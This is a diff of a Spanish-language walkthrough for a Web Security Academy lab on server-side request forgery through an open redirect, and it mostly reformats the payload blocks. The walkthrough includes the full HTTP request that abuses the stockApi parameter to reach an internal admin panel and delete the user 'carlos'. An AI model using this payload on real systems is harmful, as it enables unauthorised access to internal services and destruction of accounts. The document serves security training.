@@ -48,18 +48,17 @@ sequenceDiagram
 ```
 
 ## Cómo explotarlo
+
+> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/IP) + el **payload** del ataque (URL interna / Referer / User-Agent).
+
 Metés la ruta del open redirect como valor de `stockApi` (es del propio sitio → pasa el filtro) apuntando el `path` al host interno:
-```http
-POST /product/stock HTTP/1.1
-Host: LAB.web-security-academy.net
+<pre class="payload"><code>POST /product/stock HTTP/1.1
+Host: <mark>LAB.web-security-academy.net</mark>
 Content-Type: application/x-www-form-urlencoded
 
-stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
-```
+stockApi=<mark>/product/nextProduct?path=http://192.168.0.12:8080/admin</mark></code></pre>
 El stock-checker sigue el `302` hasta `192.168.0.12:8080/admin`. Después:
-```http
-stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
-```
+<pre class="payload"><code>stockApi=<mark>/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos</mark></code></pre>
 
 ## Verificación
 La respuesta trae el **panel admin** del host interno (llegaste vía redirect, no directo) → carlos borrado.
